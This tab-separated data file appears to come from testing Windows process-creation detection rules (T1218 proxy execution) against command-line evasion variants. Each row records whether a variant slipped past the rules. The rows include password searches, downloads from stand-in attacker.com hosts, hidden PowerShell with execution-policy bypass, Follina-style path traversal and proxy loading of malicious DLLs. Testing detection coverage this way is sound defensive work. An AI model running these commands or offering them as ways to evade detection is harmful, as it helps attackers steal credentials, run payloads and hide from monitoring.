Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141	"cmd.exe /c ""findstr /s /i \""password\"" C:\*.txt"""	"findstr /s /i ""password"" C:\*.txt"	TRUE	FALSE	FALSE	Insensitive Subfolder Search Via Findstr.EXE (04936b66-3915-43ad-a8e5-809eadfd1141); Insensitive Subfolder Search Via Findstr.EXE (04936b66-3915-43ad-a8e5-809eadfd1141)
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"findstr /s/i ""password"" C:\*.txt"	TRUE	TRUE	TRUE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141	"cmd.exe /c ""findstr -s -i \""password\"" C:\*.txt"""	"findstr -s -i ""password"" C:\*.txt"	TRUE	FALSE	FALSE	Insensitive Subfolder Search Via Findstr.EXE (04936b66-3915-43ad-a8e5-809eadfd1141); Insensitive Subfolder Search Via Findstr.EXE (04936b66-3915-43ad-a8e5-809eadfd1141)
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"findstr -si ""password"" C:\*.txt"	TRUE	TRUE	TRUE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141	"cmd.exe /c ""findstr /S /I \""password\"" C:\*.txt"""	"findstr /S /I ""password"" C:\*.txt"	TRUE	FALSE	FALSE	Insensitive Subfolder Search Via Findstr.EXE (04936b66-3915-43ad-a8e5-809eadfd1141); Insensitive Subfolder Search Via Findstr.EXE (04936b66-3915-43ad-a8e5-809eadfd1141)
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141	"cmd.exe /c ""findstr.exe /s /i \""password\"" C:\*.txt"""	"findstr.exe /s /i ""password"" C:\*.txt"	TRUE	FALSE	FALSE	Insensitive Subfolder Search Via Findstr.EXE (04936b66-3915-43ad-a8e5-809eadfd1141); Insensitive Subfolder Search Via Findstr.EXE (04936b66-3915-43ad-a8e5-809eadfd1141)
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"cmd.exe /c findstr /s /i ""password"" C:\*.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"copy findstr.exe grep.exe && grep.exe /s /i ""password"" C:\*.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"copy findstr.exe fstr.exe && fstr.exe /s /i ""password"" ."	FALSE	FALSE	FALSE	
t1218	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"findstr ""password"" . /s /i"	TRUE	TRUE	TRUE	
t1218	proc_creation_win_hktl_zipexec	Suspicious ZipExec Execution	90dcf730-1b71-4ae7-9ffc-6fcf62bd0132		"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Expand-Archive -Path 'C:\Temp\payload.zip' -DestinationPath 'C:\Temp\extracted' -Force; Start-Process 'binary.exe'"""	TRUE	TRUE	FALSE	Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1218	proc_creation_win_hktl_zipexec	Suspicious ZipExec Execution	90dcf730-1b71-4ae7-9ffc-6fcf62bd0132		powershell -ep Bypass -w Hidden -Command {Expand-Archive -Path 'C:\Temp\payload.zip' -DestinationPath 'C:\Temp\extracted' -Force; Start-Process 'binary.exe'}	TRUE	TRUE	FALSE	Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1218	proc_creation_win_hktl_zipexec	Suspicious ZipExec Execution	90dcf730-1b71-4ae7-9ffc-6fcf62bd0132		powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Expand-Archive -Path 'C:\Temp\payload.zip' -DestinationPath 'C:\Temp\extracted' -Force; Start-Process 'binary.exe'	TRUE	TRUE	FALSE	Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1218	proc_creation_win_iexpress_susp_execution	Self Extracting Package Creation Via Iexpress.EXE From Potentially Suspicious Location	b2b048b0-7857-4380-b0fb-d3f0ab820b71		"iexpress.exe /n /q /m ""C:\\Users\\Public\\Documents\\config.sed"""	TRUE	TRUE	TRUE	
t1218	proc_creation_win_iexpress_susp_execution	Self Extracting Package Creation Via Iexpress.EXE From Potentially Suspicious Location	b2b048b0-7857-4380-b0fb-d3f0ab820b71		iexpress.exe /n/q/m C:\\Windows\\Temp\\config.sed	TRUE	TRUE	TRUE	
t1218	proc_creation_win_iexpress_susp_execution	Self Extracting Package Creation Via Iexpress.EXE From Potentially Suspicious Location	b2b048b0-7857-4380-b0fb-d3f0ab820b71		iexpress.exe /n /q /m C:\\Users\\Public\\Documents\\config.sed	TRUE	TRUE	TRUE	
t1218	proc_creation_win_imewbdld_download	Arbitrary File Download Via IMEWDBLD.EXE	863218bd-c7d0-4c52-80cd-0a96c09f54af		"""C:\\WINDOWS\\System32\\IME\\SHARED\\IMEWDBLD.exe"" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_imewbdld_download	Arbitrary File Download Via IMEWDBLD.EXE	863218bd-c7d0-4c52-80cd-0a96c09f54af		copy IMEWDBLD.exe not_a_downloader.exe && not_a_downloader.exe http://attacker.com/payload.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_imewbdld_download	Arbitrary File Download Via IMEWDBLD.EXE	863218bd-c7d0-4c52-80cd-0a96c09f54af		"imewdbld.exe ""h""tt""payload.exe"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_imewbdld_download	Arbitrary File Download Via IMEWDBLD.EXE	863218bd-c7d0-4c52-80cd-0a96c09f54af		imewdbld.exe ftattacker.com/payload.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_infdefaultinstall_execute_sct_scripts	InfDefaultInstall.exe .inf Execution	ce7cf472-6fcc-490a-9481-3786840b5d9b	"cmd.exe /c ""InfDefaultInstall.exe C:\path\to\malicious.inf"""	InfDefaultInstall.exe C:\path\to\malicious.inf	TRUE	FALSE	FALSE	InfDefaultInstall.exe .inf Execution (ce7cf472-6fcc-490a-9481-3786840b5d9b); InfDefaultInstall.exe .inf Execution (ce7cf472-6fcc-490a-9481-3786840b5d9b)
t1218	proc_creation_win_infdefaultinstall_execute_sct_scripts	InfDefaultInstall.exe .inf Execution	ce7cf472-6fcc-490a-9481-3786840b5d9b	"cmd.exe /c ""InfDefaultInstall.exe  \""C:\path\to\malicious.inf\"""""	"InfDefaultInstall.exe  ""C:\path\to\malicious.inf"""	TRUE	FALSE	FALSE	InfDefaultInstall.exe .inf Execution (ce7cf472-6fcc-490a-9481-3786840b5d9b); InfDefaultInstall.exe .inf Execution (ce7cf472-6fcc-490a-9481-3786840b5d9b)
t1218	proc_creation_win_infdefaultinstall_execute_sct_scripts	InfDefaultInstall.exe .inf Execution	ce7cf472-6fcc-490a-9481-3786840b5d9b	"cmd.exe /c ""InfDefaultInstall.exe C:\path\to\malicious.INF"""	InfDefaultInstall.exe C:\path\to\malicious.INF	TRUE	FALSE	FALSE	InfDefaultInstall.exe .inf Execution (ce7cf472-6fcc-490a-9481-3786840b5d9b); InfDefaultInstall.exe .inf Execution (ce7cf472-6fcc-490a-9481-3786840b5d9b)
t1218	proc_creation_win_infdefaultinstall_execute_sct_scripts	InfDefaultInstall.exe .inf Execution	ce7cf472-6fcc-490a-9481-3786840b5d9b	"cmd.exe /c ""InfDefaultInstall.exe C:\path\to\malicious.inf.txt"""	InfDefaultInstall.exe C:\path\to\malicious.inf.txt	TRUE	FALSE	FALSE	InfDefaultInstall.exe .inf Execution (ce7cf472-6fcc-490a-9481-3786840b5d9b); InfDefaultInstall.exe .inf Execution (ce7cf472-6fcc-490a-9481-3786840b5d9b)
t1218	proc_creation_win_infdefaultinstall_execute_sct_scripts	InfDefaultInstall.exe .inf Execution	ce7cf472-6fcc-490a-9481-3786840b5d9b		copy InfDefaultInstall.exe not_suspicious.exe && not_suspicious.exe C:\path\to\malicious.inf	FALSE	FALSE	FALSE	
t1218	proc_creation_win_ldifde_file_load	Import LDAP Data Interchange Format File Via Ldifde.EXE	6f535e01-ca1f-40be-ab8d-45b19c0c8b7f		ldifde.exe -i -f http://example.com/payload.ldf	FALSE	FALSE	FALSE	
t1218	proc_creation_win_ldifde_file_load	Import LDAP Data Interchange Format File Via Ldifde.EXE	6f535e01-ca1f-40be-ab8d-45b19c0c8b7f		ldifde.exe /i /f C:\path\to\file.ldf	FALSE	FALSE	FALSE	
t1218	proc_creation_win_ldifde_file_load	Import LDAP Data Interchange Format File Via Ldifde.EXE	6f535e01-ca1f-40be-ab8d-45b19c0c8b7f		copy ldifde.exe not_suspicious.exe && not_suspicious.exe /i /f http://attacker.com/payload.ldf	FALSE	FALSE	FALSE	
t1218	proc_creation_win_ldifde_file_load	Import LDAP Data Interchange Format File Via Ldifde.EXE	6f535e01-ca1f-40be-ab8d-45b19c0c8b7f		"ldifde.exe -i -f ""http://attacker.com/payload.ldf"" -u"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_ldifde_file_load	Import LDAP Data Interchange Format File Via Ldifde.EXE	6f535e01-ca1f-40be-ab8d-45b19c0c8b7f		ldifde.exe /i /f http://attacker.com/payload.ldf	FALSE	FALSE	FALSE	
t1218	proc_creation_win_link_uncommon_parent_process	Uncommon Link.EXE Parent Process	6e968eb1-5f05-4dac-94e9-fd0c5cb49fd6		copy cmd.exe link.exe && dumpbin.exe /EXPORTS kernel32.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_link_uncommon_parent_process	Uncommon Link.EXE Parent Process	6e968eb1-5f05-4dac-94e9-fd0c5cb49fd6		"copy cmd.exe link.exe && ""dumpbin.exe"" /EXPORTS kernel32.dll"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_link_uncommon_parent_process	Uncommon Link.EXE Parent Process	6e968eb1-5f05-4dac-94e9-fd0c5cb49fd6		copy cmd.exe link.exe && dumpbin.exe /EX kernel32.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_link_uncommon_parent_process	Uncommon Link.EXE Parent Process	6e968eb1-5f05-4dac-94e9-fd0c5cb49fd6		copy cmd.exe link.exe && dumpbin.exe /EXPORTS: kernel32.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_devtoolslauncher	Devtoolslauncher.exe Executes Specified Binary	cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6		devtoolslauncher.exe LaunchForDeploy calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_devtoolslauncher	Devtoolslauncher.exe Executes Specified Binary	cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6		devtoolslauncher.exe LaunchForDeploy calc .exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_devtoolslauncher	Devtoolslauncher.exe Executes Specified Binary	cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6		devtoolslauncher.exe LaunchForDeploy `calc.exe`	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_devtoolslauncher	Devtoolslauncher.exe Executes Specified Binary	cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6		devtoolslauncher.exe LaunchForDeploy .\calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_devtoolslauncher	Devtoolslauncher.exe Executes Specified Binary	cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6		devtoolslauncher.exe LaunchForDeploy calc.exe # comment	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_devtoolslauncher	Devtoolslauncher.exe Executes Specified Binary	cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6		devtoolslauncher.exe LaunchForDeploy calc.exe #	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_devtoolslauncher	Devtoolslauncher.exe Executes Specified Binary	cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6		devtoolslauncher.exe LaunchForDeploy calc.exe\	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_gpscript	Gpscript Execution	1e59c230-6670-45bf-83b0-98903780607e		gpscript.exe /LOGON /startup	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_gpscript	Gpscript Execution	1e59c230-6670-45bf-83b0-98903780607e		"gpscript.exe /logon"" "" /startup"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_gpscript	Gpscript Execution	1e59c230-6670-45bf-83b0-98903780607e		gpscript.exe -logon -startup	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_gpscript	Gpscript Execution	1e59c230-6670-45bf-83b0-98903780607e		gpscript.exe /logon	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_gpscript	Gpscript Execution	1e59c230-6670-45bf-83b0-98903780607e		gpscript.exe /logon /startup	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_mpiexec	MpiExec Lolbin	729ce0ea-5d8f-4769-9762-e35de441586d		mpiexec.exe -n 1 calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_mpiexec	MpiExec Lolbin	729ce0ea-5d8f-4769-9762-e35de441586d		mpiexec.exe -n1 calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_mpiexec	MpiExec Lolbin	729ce0ea-5d8f-4769-9762-e35de441586d		mpiexec.exe /n 1 calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_openwith	OpenWith.exe Executes Specified Binary	cec8e918-30f7-4e2d-9bfa-a59cc97ae60f	OpenWith.exe  /c calc.exe	OpenWith.exe /c calc.exe	TRUE	FALSE	FALSE	OpenWith.exe Executes Specified Binary (cec8e918-30f7-4e2d-9bfa-a59cc97ae60f)
t1218	proc_creation_win_lolbin_openwith	OpenWith.exe Executes Specified Binary	cec8e918-30f7-4e2d-9bfa-a59cc97ae60f		OpenWith.exe -c calc.exe	TRUE	TRUE	TRUE	
t1218	proc_creation_win_lolbin_openwith	OpenWith.exe Executes Specified Binary	cec8e918-30f7-4e2d-9bfa-a59cc97ae60f	OpenWith.exe  /c calc.exe 	OpenWith.exe /c calc.exe >nul 2>&1	TRUE	FALSE	FALSE	OpenWith.exe Executes Specified Binary (cec8e918-30f7-4e2d-9bfa-a59cc97ae60f)
t1218	proc_creation_win_lolbin_openwith	OpenWith.exe Executes Specified Binary	cec8e918-30f7-4e2d-9bfa-a59cc97ae60f	OpenWith.exe  /c calc.exe	OpenWith.exe ^/c calc.exe	TRUE	FALSE	FALSE	OpenWith.exe Executes Specified Binary (cec8e918-30f7-4e2d-9bfa-a59cc97ae60f)
t1218	proc_creation_win_lolbin_openwith	OpenWith.exe Executes Specified Binary	cec8e918-30f7-4e2d-9bfa-a59cc97ae60f	OpenWith.exe  /c calc.exe 	OpenWith.exe /c calc.exe | findstr .	TRUE	FALSE	FALSE	OpenWith.exe Executes Specified Binary (cec8e918-30f7-4e2d-9bfa-a59cc97ae60f)
t1218	proc_creation_win_lolbin_pcwrun_follina	Execute Pcwrun.EXE To Leverage Follina	6004abd0-afa4-4557-ba90-49d172e0a299		"pcwrun.exe msdt.exe /id PCWDiagnostic /skip true /param ""IT_BrowseForFile=..\..\..\Windows\System32\calc.exe"""	TRUE	TRUE	FALSE	Potential Command Line Path Traversal Evasion Attempt (1327381e-6ab0-4f38-b583-4c1b8346a56b); Potential Command Line Path Traversal Evasion Attempt (1327381e-6ab0-4f38-b583-4c1b8346a56b); Indirect Command Execution By Program Compatibility Wizard (b97cd4b1-30b8-4a9d-bd72-6293928d52bc)
t1218	proc_creation_win_lolbin_pcwrun_follina	Execute Pcwrun.EXE To Leverage Follina	6004abd0-afa4-4557-ba90-49d172e0a299		"pcwrun.exe msdt.exe /id PCWDiagnostic /skip true /param ""IT_BrowseForFile=..\\..\\..\\Windows\\System32\\calc.exe"""	TRUE	TRUE	FALSE	Indirect Command Execution By Program Compatibility Wizard (b97cd4b1-30b8-4a9d-bd72-6293928d52bc)
t1218	proc_creation_win_lolbin_pcwrun_follina	Execute Pcwrun.EXE To Leverage Follina	6004abd0-afa4-4557-ba90-49d172e0a299		"pcwrun.exe msdt.exe /id PCWDiagnostic /skip true /param ""IT_BrowseForFile=..%2F..%2F..%2FWINDOWS%2Fsystem32%2Fcalc.exe"""	TRUE	TRUE	FALSE	Indirect Command Execution By Program Compatibility Wizard (b97cd4b1-30b8-4a9d-bd72-6293928d52bc)
t1218	proc_creation_win_lolbin_rasautou_dll_execution	DLL Execution via Rasautou.exe	cd3d1298-eb3b-476c-ac67-12847de55813	rasautou.exe  -d test.dll -p DllMain	rasautou.exe -d test.dll -p DllMain	TRUE	FALSE	FALSE	DLL Execution via Rasautou.exe (cd3d1298-eb3b-476c-ac67-12847de55813)
t1218	proc_creation_win_lolbin_rasautou_dll_execution	DLL Execution via Rasautou.exe	cd3d1298-eb3b-476c-ac67-12847de55813		rasautou.exe -d test.dll -pDllMain	TRUE	TRUE	TRUE	
t1218	proc_creation_win_lolbin_rasautou_dll_execution	DLL Execution via Rasautou.exe	cd3d1298-eb3b-476c-ac67-12847de55813	rasautou.exe  -p DllMain -d test.dll	rasautou.exe -p DllMain -d test.dll	TRUE	FALSE	FALSE	DLL Execution via Rasautou.exe (cd3d1298-eb3b-476c-ac67-12847de55813)
t1218	proc_creation_win_lolbin_rasautou_dll_execution	DLL Execution via Rasautou.exe	cd3d1298-eb3b-476c-ac67-12847de55813		"rasautou.exe -d""test.dll"" -p""DllMain"""	TRUE	TRUE	TRUE	
t1218	proc_creation_win_lolbin_register_app	REGISTER_APP.VBS Proxy Execution	1c8774a0-44d4-4db0-91f8-e792359c70bd		copy register_app.vbs legit_script.vbs && cscript //nologo legit_script.vbs -register YourMalicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_register_app	REGISTER_APP.VBS Proxy Execution	1c8774a0-44d4-4db0-91f8-e792359c70bd		copy register_app.vbs legit_script.vbs && cscript //nologo legit_script.vbs --register YourMalicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_register_app	REGISTER_APP.VBS Proxy Execution	1c8774a0-44d4-4db0-91f8-e792359c70bd		copy register_app.vbs legit_script.vbs && cscript /nologo legit_script.vbs -register YourMalicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_register_app	REGISTER_APP.VBS Proxy Execution	1c8774a0-44d4-4db0-91f8-e792359c70bd		"copy register_app.vbs legit_script.vbs && cscript //nologo legit_script.vbs -register ""YourMalicious.dll"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_scriptrunner	Use of Scriptrunner.exe	64760eef-87f7-4ed3-93fd-655668ea9420		ScriptRunner.exe -appvscript calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_scriptrunner	Use of Scriptrunner.exe	64760eef-87f7-4ed3-93fd-655668ea9420		ScriptRunner.exe /appvscript calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_scriptrunner	Use of Scriptrunner.exe	64760eef-87f7-4ed3-93fd-655668ea9420		"ScriptRunner.exe -appvscript"" calc.exe"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_syncappvpublishingserver_execute_psh	SyncAppvPublishingServer Execute Arbitrary PowerShell Code	fbd7c32d-db2a-4418-b92c-566eb8911133		"SyncAppvPublishingServer.exe ""n;"" -ex Bypass -File script.ps1"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_syncappvpublishingserver_execute_psh	SyncAppvPublishingServer Execute Arbitrary PowerShell Code	fbd7c32d-db2a-4418-b92c-566eb8911133		"SyncAppvPublishingServer.exe ""n;"" `nStop-Process -Name 'lsass'"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_syncappvpublishingserver_execute_psh	SyncAppvPublishingServer Execute Arbitrary PowerShell Code	fbd7c32d-db2a-4418-b92c-566eb8911133		"SyncAppvPublishingServer.exe ""n;"" Start-Process calc.exe"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh	SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code	36475a7d-0f6d-4dce-9b01-6aeb473bbaf1		"cmd.exe /c C:\windows\system32\SyncAppvPublishingServer.vbs ""\n;Start-Process calc"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh	SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code	36475a7d-0f6d-4dce-9b01-6aeb473bbaf1		"copy SyncAppvPublishingServer.vbs Update.vbs && cscript Update.vbs ""\n;powershell.exe -NoP -Command Write-Host 'Bypassed'"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh	SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code	36475a7d-0f6d-4dce-9b01-6aeb473bbaf1		"wscript.exe ""SyncAppvPublishingServer.vbs"" ""\"" & powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command 'WhoAmI'"	TRUE	TRUE	TRUE	
t1218	proc_creation_win_lolscript_register_app	Potential Register_App.Vbs LOLScript Abuse	28c8f68b-098d-45af-8d43-8089f3e35403		"copy C:\Windows\System32\vss\vsssampleprovider\register_app.vbs %TEMP%\legit.txt && cscript //e:vbscript %TEMP%\legit.txt -register ""malicious.dll"" ""MaliciousProvider"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolscript_register_app	Potential Register_App.Vbs LOLScript Abuse	28c8f68b-098d-45af-8d43-8089f3e35403		copy C:\Windows\System32\vss\vsssampleprovider\register_app.vbs %TEMP%\legit.txt && cscript //e:vbscript %TEMP%\legit.txt -register malicious.dll MaliciousProvider	FALSE	FALSE	FALSE	
t1218	proc_creation_win_mofcomp_execution	Potential Suspicious Mofcomp Execution	1dd05363-104e-4b4a-b963-196a534b03a1		"""C:\windows\system32\wbem\mofcomp.exe"" C:\Windows\Temp\evasion.mof"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_mofcomp_execution	Potential Suspicious Mofcomp Execution	1dd05363-104e-4b4a-b963-196a534b03a1	"mofcomp.exe  -N:root\subscription \""C:\Users\Public\malicious.mof\"""	"mofcomp.exe -N:root\subscription ""C:\Users\Public\malicious.mof"""	TRUE	FALSE	FALSE	Potential Suspicious Mofcomp Execution (1dd05363-104e-4b4a-b963-196a534b03a1)
t1218	proc_creation_win_mofcomp_execution	Potential Suspicious Mofcomp Execution	1dd05363-104e-4b4a-b963-196a534b03a1		"Start-Process mofcomp.exe -ArgumentList ""C:\Windows\TEMP\evasion.mof"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_mofcomp_execution	Potential Suspicious Mofcomp Execution	1dd05363-104e-4b4a-b963-196a534b03a1		copy mofcomp.exe not_mof.exe && not_mof.exe C:\Windows\Tasks\malicious.mof	FALSE	FALSE	FALSE	
t1218	proc_creation_win_mpcmdrun_download_arbitrary_file	File Download Via Windows Defender MpCmpRun.EXE	46123129-1024-423e-9fae-43af4a0fa9a5		MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt	FALSE	FALSE	FALSE	
